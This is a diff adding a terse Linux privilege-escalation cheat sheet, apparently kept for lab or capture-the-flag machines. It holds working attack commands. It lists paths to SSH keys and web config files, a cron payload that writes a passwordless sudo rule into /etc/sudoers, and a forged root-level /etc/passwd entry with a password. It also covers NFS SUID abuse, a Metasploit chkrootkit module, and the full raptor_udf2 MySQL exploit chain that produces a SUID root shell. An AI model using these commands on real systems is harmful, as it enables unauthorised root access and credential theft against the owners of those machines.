@@ -1,0 +1,50 @@
+# Credentials
+    # web config
+        - /var/www/html/**/config.php
+
+    # ssh key 
+    **/.ssh/id_rsa
+    **/.ssh/id_ed25519
+    ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP
+
+
+# Cron
+    # Add to sudoers
+    printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
+
+    # crontab file
+        - /etc/crontab
+        - /etc/cron.d
+        - /var/spool/cron/crontabls/root
+
+
+
+# /etc/passwd
+    openssl passwd -1 -salt [salt] [password]
+    uuidd:$6$ZxbzhDipt80zjkpS$PH4qOtRekXWvfHmyLv5MIzwl7D1pGPETXdOgczHUVyEIN1m77mrqOps8din9hxKThhzx1X5PQdd9gsJ2hNtUZ1:0:0:root:/root:/bin/bash
+    # V3rysTR0Ngpa$&
+
+# metasploit chkrootkit binary
+    exploit/unix/local/chkrootkit
+
+# NFS
+    showmount -e <IP>
+    mkdir /tmp/backup
+    mount -o rw <IP>:/<MOUNT> /tmp/backup
+    gcc -o exploit /tmp/ld_preload.c
+    chmod +s exloit
+
+# mysql
+    # mysql 4.1< as root 
+    gcc -g -c raptor_udf2.c -fPIC
+    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+    mysql -u root
+    use mysql;
+    create table foo(line blob);
+    insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+    select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+    create function do_system returns integer soname 'raptor_udf2.so';
+    select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+    /tmp/rootbash -p
+
+    
